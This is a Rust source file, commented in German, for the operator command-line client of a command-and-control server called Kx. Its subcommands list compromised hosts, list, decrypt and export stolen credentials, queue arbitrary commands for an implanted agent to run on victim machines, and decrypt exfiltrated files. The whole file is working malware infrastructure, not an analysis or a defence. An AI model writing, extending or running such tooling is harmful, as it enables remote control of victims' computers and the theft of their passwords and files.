//! Kx-CLI: Operator-Oberfläche für den Kx-C2-Server.
//!
//! Ermöglicht das Auflisten von Hosts und Secrets sowie den Export von
//! erbeuteten Credentials. Kommuniziert über TLS mit dem C2-Backend.

mod client;
mod decrypt;

use std::path::PathBuf;

use clap::{Parser, Subcommand};
use tracing::{error, info};

#[derive(Parser)]
#[command(name = "kx-cli", about = "Kx-Operator-Oberfläche")]
struct Cli {
    /// URL des C2-Servers (https://host:port).
    #[arg(long, env = "KX_C2_URL")]
    server: String,
    /// Bearer-Token für den C2-Server.
    #[arg(long, env = "KX_C2_TOKEN")]
    token: String,
    /// Pfad zum Server-Zertifikat (PEM).
    #[arg(long)]
    cert: String,

    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand)]
enum Command {
    /// Alle registrierten Hosts auflisten.
    Hosts,
    /// Alle erbeuteten Secrets auflisten.
    Secrets {
        /// Optionaler Filter nach Benutzername (Teilstring).
        #[arg(long)]
        user: Option<String>,
        /// Die Secrets mit dem geheimen Server-Schluessel entschluesseln.
        ///
        /// Ohne diese Option bleibt das Passwort verschluesselt.
        #[arg(long)]
        decrypt: bool,
        /// Pfad zum geheimen Server-Schluessel (JSON) — noetig fuer --decrypt.
        #[arg(long)]
        server_key: Option<PathBuf>,
    },
    /// Secrets in eine Datei exportieren (JSON oder CSV).
    Export {
        /// Zielpfad für den Export.
        path: PathBuf,
        /// Format: json oder csv.
        #[arg(long, default_value = "json")]
        format: String,
        /// Die Secrets vor dem Export entschluesseln.
        #[arg(long)]
        decrypt: bool,
        /// Pfad zum geheimen Server-Schluessel (JSON) — noetig fuer --decrypt.
        #[arg(long)]
        server_key: Option<PathBuf>,
    },
    /// Alle Tasks auflisten.
    Tasks,
    /// Einen Task anlegen — der Agent holt ihn ab und führt ihn aus.
    TaskCreate {
        /// Kennung des Ziel-Hosts (siehe `kx-cli hosts`).
        #[arg(long)]
        host_id: String,
        /// Der auszuführende Befehl.
        #[arg(long)]
        command: String,
    },
    /// Alle exfiltrierten Datei-Container auflisten (Issue #31).
    Files,
    /// Einen KXENC-Container entschluesseln und als Datei ablegen.
    ///
    /// Der Klartext entsteht auf dem Rechner des Operators, nicht auf dem
    /// Server — wie bei `secrets --decrypt`.
    FileOpen {
        /// Datei-Kennung (siehe `kx-cli files`).
        #[arg(long)]
        file_id: String,
        /// Zielpfad fuer den Klartext.
        #[arg(long)]
        out: PathBuf,
        /// Pfad zum geheimen Server-Schluessel (JSON).
        #[arg(long)]
        server_key: PathBuf,
    },
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into()),
        )
        .init();

    let cli = Cli::parse();
    let c = match client::Client::new(&cli.server, &cli.token, &cli.cert) {
        Ok(c) => c,
        Err(e) => {
            error!("Client-Init fehlgeschlagen: {e}");
            std::process::exit(1);
        }
    };

    match &cli.command {
        Command::Hosts => match c.hosts().await {
            Ok(hosts) => {
                info!("{} Hosts gefunden", hosts.len());
                for h in &hosts {
                    println!("{:<15} {:<20} {:<15} {}", h.ip, h.hostname, h.os, h.status);
                }
            }
            Err(e) => {
                error!("Host-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::Secrets {
            user,
            decrypt,
            server_key,
        } => match c.secrets().await {
            Ok(secrets) => {
                let filtered: Vec<_> = secrets
                    .iter()
                    .filter(|s| user.as_deref().map_or(true, |u| s.username.contains(u)))
                    .collect();
                info!("{} Secrets gefunden", filtered.len());
                if *decrypt {
                    let eigen: Vec<_> = filtered.iter().map(|s| (*s).clone()).collect();
                    let entschluesselt = entschluesseln(&c, server_key.as_deref(), &eigen).await;
                    for s in &entschluesselt {
                        println!(
                            "{:<20} {:<20} {:<30} {:<15} {}",
                            s.host_id, s.cred_type, s.username, s.source, s.password
                        );
                    }
                } else {
                    for s in &filtered {
                        let passwort = if s.password.is_empty() {
                            "<verschluesselt>".to_string()
                        } else {
                            s.password.clone()
                        };
                        println!(
                            "{:<20} {:<20} {:<30} {:<15} {}",
                            s.host_id, s.cred_type, s.username, s.source, passwort
                        );
                    }
                }
            }
            Err(e) => {
                error!("Secret-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::Export {
            path,
            format,
            decrypt,
            server_key,
        } => match c.secrets().await {
            Ok(secrets) => {
                let zu_exportieren: Vec<kx_core::c2::ExfiltratedSecret> = if *decrypt {
                    // Derselbe Typ wie die Eingabe — der Export ist ein
                    // Feld-Transfer, kein Typwechsel. Vorher wurde hier
                    // zurückgebaut, und dabei gingen `id` und `collected_at`
                    // verloren.
                    entschluesseln(&c, server_key.as_deref(), &secrets).await
                } else {
                    secrets.clone()
                };
                match client::export(&zu_exportieren, path, format) {
                    Ok(()) => info!(
                        "{} Secrets nach {} exportiert",
                        zu_exportieren.len(),
                        path.display()
                    ),
                    Err(e) => {
                        error!("Export fehlgeschlagen: {e}");
                        std::process::exit(1);
                    }
                }
            }
            Err(e) => {
                error!("Secret-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::Tasks => match c.tasks().await {
            Ok(tasks) => {
                info!("{} Tasks gefunden", tasks.len());
                for t in &tasks {
                    println!("{:<36} {:<20} {}", t.id, t.status, t.created_at);
                }
            }
            Err(e) => {
                error!("Task-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::TaskCreate { host_id, command } => {
            let req = kx_core::c2::CreateTaskRequest {
                host_id: host_id.clone(),
                command: command.clone(),
            };
            match c.create_task(&req).await {
                Ok(id) => info!("Task {id} für {host_id} angelegt: {command}"),
                Err(e) => {
                    error!("Task-Anlage fehlgeschlagen: {e}");
                    std::process::exit(1);
                }
            }
        }
        Command::Files => match c.files().await {
            Ok(files) => {
                info!("{} Dateien gefunden", files.len());
                for f in &files {
                    println!(
                        "{:<34} {:<20} {:<30} {:>12} {:<25} {}",
                        f.file_id, f.host_id, f.filename, f.plain_size, f.collected_at, f.id
                    );
                }
            }
            Err(e) => {
                error!("Datei-Abfrage fehlgeschlagen: {e}");
                std::process::exit(1);
            }
        },
        Command::FileOpen {
            file_id,
            out,
            server_key,
        } => {
            let files = match c.files().await {
                Ok(f) => f,
                Err(e) => {
                    error!("Datei-Abfrage fehlgeschlagen: {e}");
                    std::process::exit(1);
                }
            };
            let Some(file) = files.iter().find(|f| &f.file_id == file_id) else {
                error!("Keine Datei mit Kennung {file_id} — siehe `kx-cli files`");
                std::process::exit(1);
            };
            let entschluesseler = match decrypt::Decryptor::load(server_key) {
                Ok(d) => d,
                Err(e) => {
                    error!("Server-Schluessel unbrauchbar: {e}");
                    std::process::exit(1);
                }
            };
            let hosts = match c.hosts().await {
                Ok(h) => h,
                Err(e) => {
                    error!("Host-Abfrage fehlgeschlagen: {e}");
                    std::process::exit(1);
                }
            };
            let klartext = match entschluesseler.decrypt_file(file, &hosts) {
                Ok(k) => k,
                Err(e) => {
                    error!("Entschluesselung fehlgeschlagen: {e}");
                    std::process::exit(1);
                }
            };
            if let Err(e) = std::fs::write(out, &klartext) {
                error!("Klartext nicht schreibbar ({}): {e}", out.display());
                std::process::exit(1);
            }
            info!(
                "{} ({} Byte) entschluesselt nach {}",
                file.filename,
                klartext.len(),
                out.display()
            );
        }
    }
}

/// Entschluesselt die Secrets mit dem geheimen Server-Schluessel.
///
/// Ohne Schluesseldatei bricht das ab — ohne den Schluessel lassen sich die
/// Passwoerter nicht lesen.
async fn entschluesseln(
    client: &client::Client,
    server_key: Option<&std::path::Path>,
    secrets: &[kx_core::c2::ExfiltratedSecret],
) -> Vec<kx_core::c2::ExfiltratedSecret> {
    let pfad = match server_key {
        Some(p) => p,
        None => {
            error!("--decrypt braucht --server-key <datei>");
            std::process::exit(1);
        }
    };
    let entschluesseler = match decrypt::Decryptor::load(pfad) {
        Ok(d) => d,
        Err(e) => {
            error!("Server-Schluessel unbrauchbar: {e}");
            std::process::exit(1);
        }
    };
    let hosts = match client.hosts().await {
        Ok(h) => h,
        Err(e) => {
            error!("Host-Abfrage fehlgeschlagen: {e}");
            std::process::exit(1);
        }
    };
    entschluesseler.decrypt_all(&hosts, secrets)
}
